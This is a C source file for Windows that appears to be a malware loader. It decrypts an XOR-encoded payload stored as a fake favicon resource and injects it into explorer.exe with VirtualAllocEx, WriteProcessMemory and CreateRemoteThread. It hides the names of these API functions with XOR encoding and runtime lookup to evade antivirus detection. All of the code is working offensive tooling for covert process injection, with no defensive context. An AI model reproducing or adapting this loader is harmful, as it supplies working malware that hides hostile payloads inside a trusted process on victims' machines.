#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"

LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

BOOL (WINAPI * pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);

HANDLE (WINAPI * pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);

BOOL (WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

char key[] = "mysecretkeee";

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
		
	char sCreateToolhelp32Snapshot[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x31, 0x1b, 0x4, 0x9, 0xd, 0x0, 0x1, 0x9, 0x40, 0x57, 0x30, 0x1c, 0x4, 0x4, 0x18, 0xd, 0xa, 0x11 };
	char sProcess32First[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x23, 0xc, 0x17, 0x1e, 0xd };
	char sProcess32Next[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x2b, 0x0, 0x1d, 0x19 };

	// Decrypt (DeXOR) the strings sVirtualAllocEx, sWriteProcessMemory and sCreateRemoteThread
	XOR((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), key, sizeof(key));
	XOR((char *) sProcess32First, sizeof(sProcess32First), key, sizeof(key));
	XOR((char *) sProcess32Next, sizeof(sProcess32Next), key, sizeof(key));
		
	//resolving function addresses dynamically using GetProcAddress and GetModuleHandle
	pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle("Kernel32.dll"), sCreateToolhelp32Snapshot);
	pProcess32First = GetProcAddress(GetModuleHandle("Kernel32.dll"), sProcess32First);
	pProcess32Next = GetProcAddress(GetModuleHandle("Kernel32.dll"), sProcess32Next);
        
	// Create a snapshot of the system processes
        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		
	// Check if the snapshot creation was successful
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
        
	// Get the first process entry in the snapshot
        if (!pProcess32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
        
	// Iterate through the processes in the snapshot
        while (pProcess32Next(hProcSnap, &pe32)) {
		// Compare the process name with the provided name (Case-Insensitive)
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
			// Process name matches, store the process ID
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
        
	// Close the handle to the snapshot
        CloseHandle(hProcSnap);
        
	// Return the process ID (0 if not found)
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
	char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
	char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
	char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };

	// Decrypt (DeXOR) the strings sVirtualAllocEx, sWriteProcessMemory and sCreateRemoteThread
	XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
	XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
	XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
		
	//resolving function addresses dynamically using GetProcAddress and GetModuleHandle
	pVirtualAllocEx = GetProcAddress(GetModuleHandle("Kernel32.dll"), sVirtualAllocEx);
	pWriteProcessMemory = GetProcAddress(GetModuleHandle("Kernel32.dll"), sWriteProcessMemory);
	pCreateRemoteThread = GetProcAddress(GetModuleHandle("Kernel32.dll"), sCreateRemoteThread);
		
	// Allocate memory in the remote process to store the payload
        pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
		
	// Write the payload to the allocated memory in the remote process
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
	// Create a remote thread in the remote process, starting at the address of the allocated memory
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
		// Wait for the remote thread to finish executing (500 milliseconds timeout)
                WaitForSingleObject(hThread, 500);
		// Close the handle to the remote thread
                CloseHandle(hThread);
		// Return 0 to indicate success
                return 0;
        }
	// Return -1 to indicate failure
        return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	int pid = 0;
    	HANDLE hProc = NULL;
	
	unsigned char * payload;
	unsigned int payload_len;
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Decrypt (DeXOR) the payload which exists in the allocated memory exec_mem
	XOR((char *) exec_mem, payload_len, key, sizeof(key));
	
	// Process Injection starts HERE...
	// Find the process ID (PID) of the target process (in this case, explorer.exe)
	pid = FindTarget("explorer.exe");

	if (pid) {
		// Try to open the target process with specific access rights
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			// Call the Inject function to inject the decrypted payload (exec_mem) into the target process
			Inject(hProc, exec_mem, payload_len);
			
			// Close the handle to the target process
			CloseHandle(hProc);
		}
	}

	return 0;
}
